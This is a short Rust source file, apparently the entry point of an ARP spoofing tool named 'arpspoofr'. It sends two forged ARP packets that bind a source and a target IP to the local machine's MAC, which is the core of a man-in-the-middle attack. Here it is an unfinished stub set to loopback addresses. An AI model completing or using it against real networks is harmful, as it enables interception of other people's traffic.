extern crate arpspoofr;

use arpspoofr::*;

use pnet::datalink::MacAddr;
use std::net::Ipv4Addr;

fn main() {
    let (mut tx, _rx, iface) = open_interface("lo");

    let local_mac = iface.mac_address();

    // TODO: Take in as input
    let source_ip = Ipv4Addr::new(127, 0, 0, 1);
    let target_ip = Ipv4Addr::new(127, 0, 0, 1);

    // TODO: Arp cache lookup to get mac of source and target
    let source_mac = MacAddr::new(0, 0, 0, 0, 0, 0);
    let target_mac = MacAddr::new(0, 0, 0, 0, 0, 0);

    // Send packet to bind source ip to local mac
    send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac);

    // Send packet to bind target ip to local mac
    send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac);
}
